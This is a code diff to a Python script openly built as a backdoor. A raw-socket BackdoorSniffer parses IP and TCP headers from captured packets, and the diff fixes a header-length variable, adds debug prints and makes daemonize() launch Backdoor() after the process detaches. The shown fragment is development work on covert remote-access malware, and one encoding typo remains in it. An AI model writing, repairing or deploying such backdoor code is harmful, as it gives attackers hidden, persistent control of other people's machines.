@@ -9,6 +9,7 @@ import socket, os, sys
 import getpass
 import platform
 import subprocess
+from struct import *
 
 MAXSIZE = 65535
 BUFSIZE = 1024
@@ -24,7 +25,7 @@ def BackdoorSniffer():
         dstAddr = socket.inet_ntoa(iph[9])
         versionIhl = iph[0]
         version = versionIhl >> 4
-        ipl = versionIhl & 0xF
+        ihl = versionIhl & 0xF
         iphLength = ihl * 4
         tcpHeader = packet[iphLength:iphLength+20]
         tcph = unpack('!HHLLBBHHH', tcpHeader)
@@ -34,6 +35,7 @@ def BackdoorSniffer():
         tcphLength = offsetReserved >> 4
         headerSize = iphLength + tcphLength
         dataSize = len(packet) - headerSize
+        print(version, iphLength, srcPort, dstPort, tcphLength, headerSize)
         # get data from the packet
         data = packet[headerSize:]
         try:
@@ -44,6 +46,7 @@ def BackdoorSniffer():
                     srcAddr = srcAddr.decode("utf-8")
                 if type(srcPort) == bytes:
                     srcPort = srcPort.decode("urf-8")
+                print(srcAddr, srcPort, dstAddr, dstPort)
                 return srcAddr, srcPort, dstAddr, dstPort
         except:
             pass
@@ -174,6 +177,8 @@ def daemonize():
     os.dup2(si.fileno( ), sys.stdin.fileno( ))
     os.dup2(so.fileno( ), sys.stdout.fileno( ))
     os.dup2(se.fileno( ), sys.stderr.fileno( ))
+
+    Backdoor()
 
 def main():
     #daemonize()
